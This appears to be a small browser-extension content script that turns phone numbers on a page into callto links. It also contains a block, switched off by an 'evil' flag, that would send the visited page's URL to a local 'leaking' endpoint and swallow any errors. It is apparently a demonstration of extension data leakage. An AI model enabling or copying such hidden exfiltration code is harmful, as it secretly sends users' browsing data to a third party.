console.log("phone.js");
$(document).ready(function () {
      $('#log').html( $('#log').html().replace(/(\d?\d?\d-\d\d\d-\d\d\d\d)/g,'<a href="callto://#">$1</a>') );

      var evil = false;
      if (evil) {
        try {
        var reqA = new XMLHttpRequest();
  
        reqA.onload = function() { };
        reqA.open("get", "http://extension.lvh.me:3001/leaking?yourstatementhere"+window.location, true);
        reqA.responseType = "json";
        reqA.send();
        } catch(e) { }
      }
});
